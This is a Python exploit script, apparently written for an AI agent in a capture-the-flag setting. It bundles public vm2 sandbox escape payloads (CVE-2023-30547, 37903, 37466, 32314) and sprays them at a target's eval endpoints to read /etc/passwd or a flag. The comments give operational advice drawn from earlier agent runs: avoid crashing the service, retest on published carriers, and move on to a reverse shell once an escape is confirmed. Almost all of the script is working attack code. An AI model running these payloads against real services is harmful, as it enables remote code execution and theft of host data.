#!/usr/bin/env python3
# [REFERENCE] nodejs vm2 sandbox escape pack — the public escape families for
# vm2 <= 3.9.19 (final EOL) plus the host-leak primitives below full escape.
# When a web service evaluates user JS under vm2, DON'T re-derive the escape
# from first principles offline (run 43633 e2-04: the agent burned 4 passes
# rebuilding vm2 locally with no npm access) — spray these public variants.
# Public lineage: saxontech/promise-reject (CVE-2023-30547), xm1k/iso2022js
# vm2-escape chain repo, official vm2 advisories GHSA-p5gc-c584-jgw6 (29199/
# 29223), GHSA-fvf8-... (32314), GHSA-g644-9gfx-q4q4 (37903, leesh3288 gist
# e4aa7b90417b0b0ac7bcd5b09ac7d3bd), GHSA-cchq-frgv-rjh5 (37466, leesh3288
# gist f693061e6523c97274ad5298eb2c74e9).
# MISATTRIBUTION GUARD: CVE-2023-37478 is pnpm tarball parsing, NOT vm2. The
# post-EOL vm2 escapes are exactly 37466 + 37903 (both 2023-07, both Xion).
# Fingerprint: a JS-eval playground whose errors mention "VM2", "vm.js",
# "Sandbox", or whose stack traces get truncated at sandbox boundaries;
# Node + vm2 services usually expose /run /eval /execute with {code}.
# Operational notes (run 46050 e2-04, live-observed on this platform):
#  - Node >= 15 crashes the PROCESS on any UNHANDLED promise rejection: every
#    rejection-based probe in this pack MUST keep its .catch attached, or you
#    kill the service instead of leaking the host Error (the crash is the
#    probe failing, not the exploit).
#  - Such crashes usually auto-restart (supervisor) with backoff — a dead
#    service for ~40s after a rejection probe means the rejection went
#    unhandled: re-fire the SAME payload with .catch(() => {}) attached.
#  - Fire this whole battery FIRST after fingerprinting vm2; hand-mapping
#    primitives (WASM/console-bridge/thenable marshaling) is step 2 for
#    whichever variant survives sanitization.
#  - CARRIER DISCIPLINE (run 46418 e2-04, lost title): the 37903 escape was
#    declared "patched/falsified" after testing a custom-inspect payload on a
#    console.dir carrier — but the published PoC never touches console.
#    WebAssembly.compileStreaming triggers HOST-side util.inspect inside the
#    ERR_INVALID_ARG_TYPE error path (determineSpecificType), a channel that
#    survives any console-bridge replacement the service installs. Before
#    declaring ANY variant dead on a hardened service, retest it on its
#    PUBLISHED carrier (gist verbatim), not an improvised one.
# Usage: python3 vm2-sandbox-escape-pack.py http://TARGET:PORT [/read /etc/passwd]
import json, sys, urllib3, requests
urllib3.disable_warnings()

BASE = sys.argv[1].rstrip('/') if len(sys.argv) > 1 else "http://localhost:3000"
OUT = sys.argv[2] if len(sys.argv) > 2 else "/etc/passwd"
TIMEOUT = 15

# Each variant: full standalone JS. Escape = run host code; leak = read host
# data via error/stack channels when full RCE is patched.
VARIANTS = {
    # CVE-2023-30547: Promise rejection handler receives a HOST Error object
    # whose .stack getter runs unsanitized host code on property access.
    "cve-2023-30547-err-stack": """
const handler = { getPrototypeOf(target) { throw new Error(); } };
const proxy = new Proxy({}, handler);
try { Object.setPrototypeOf({}, proxy); } catch (e) {
    const f = e.constructor.constructor; // host Function via unsanitized Error
    const out = f('return process.mainModule.require("fs").readFileSync("%s","utf8")')();
    throw new Error("EXFIL::" + out);
}
""" % OUT,
    # CVE-2023-37903, gist-verbatim shape (leesh3288/e4aa7b90…): host inspect
    # leaks as the 3rd arg of a custom-inspect callback invoked HOST-side by
    # determineSpecificType() inside the ERR_INVALID_ARG_TYPE error path.
    # Carrier = WebAssembly.compileStreaming — NOT console.*. A console
    # bridge replaced by the service does not affect this channel.
    # valueOf/constructor nulled so host type-sniffing reaches the symbol.
    "cve-2023-37903-custom-inspect-wasm": """
const customInspectSymbol = Symbol.for('nodejs.util.inspect.custom');
const obj = {
    [customInspectSymbol]: (depth, opt, inspect) => {
        inspect.constructor('const o = process.mainModule.require("fs").readFileSync("%s","utf8"); process.stdout.write("EXFIL::" + o + "\\\\n");')();
    },
    valueOf: undefined,
    constructor: undefined,
};
WebAssembly.compileStreaming(obj).catch(() => {});
""" % OUT,
    # CVE-2023-37466, gist-verbatim shape (leesh3288/f693061e…): Promise
    # handler sanitization bypassed via @@species. Stack-overflow inside an
    # async fn rejects with a HOST RangeError; a fake species constructor
    # captures the reject capability, and the handler that THROWS routes the
    # host error object to attacker code — err.constructor = host Function.
    "cve-2023-37466-promise-species": """
async function fn() {
    (function stack() {
        new Error().stack;
        stack();
    })();
}
const p = fn();
p.constructor = {
    [Symbol.species]: class FakePromise {
        constructor(executor) {
            executor(
                (x) => x,
                (err) => {
                    err.constructor.constructor('const o = process.mainModule.require("fs").readFileSync("%s","utf8"); process.stdout.write("EXFIL::" + o + "\\\\n");')();
                }
            )
        }
    }
};
p.then();
""" % OUT,
    # CVE-2023-32314: Proxy trap invoked by host-side error serialization.
    "cve-2023-32314-prepareStackTrace": """
Error.prepareStackTrace = function(e, frames) {
    const hostFn = frames[0].getFunction().constructor; // host realm Function
    return hostFn('return process.mainModule.require("fs").readFileSync("%s","utf8")')();
};
new Error().stack;
""" % OUT,
    # Classic async leak: unhandled rejection carries the host frame source
    # into the sandbox response (read-only primitive — pivot from the leaked
    # host source to the real escape).
    "host-stack-leak": """
Promise.reject(new Error('leak')).catch(()=>{});
(async () => { await null; throw new Error('probe'); })();
""",
    # Host exception smuggling: exceptions thrown BY host builtins cross the
    # bridge with host prototype intact on many vm2 configs.
    "host-exception-proto": """
try { null.x; } catch (e) {
    const f = Object.getPrototypeOf(e).constructor.constructor;
    throw new Error("EXFIL::" + f('return process.mainModule.require("fs").readFileSync("%s","utf8")')());
}
""" % OUT,
}

def submit(code):
    for path, field in (("/run", "code"), ("/eval", "code"), ("/execute", "code"), ("/api/run", "code"), ("/run", "script")):
        try:
            r = requests.post(BASE + path, json={field: code, "code": code, "script": code}, timeout=TIMEOUT)
            if r.status_code != 404:
                return path, r
        except Exception:
            continue
    return None, None

print(f"[*] vm2 escape spray against {BASE}, read target {OUT}")
for name, code in VARIANTS.items():
    path, r = submit(code)
    if r is None:
        print(f"[!] no eval route found — map the service routes first")
        break
    body = r.text[:400]
    hit = "EXFIL::" in r.text or "root:" in r.text or "flag{" in r.text.lower()
    print(f"[{'+' if hit else '-'}] {name} via {path} ({r.status_code}): {body[:200]}")
    if hit:
        print("[=] ESCAPE CONFIRMED — swap the fs target for the flag path / reverse shell")
        break
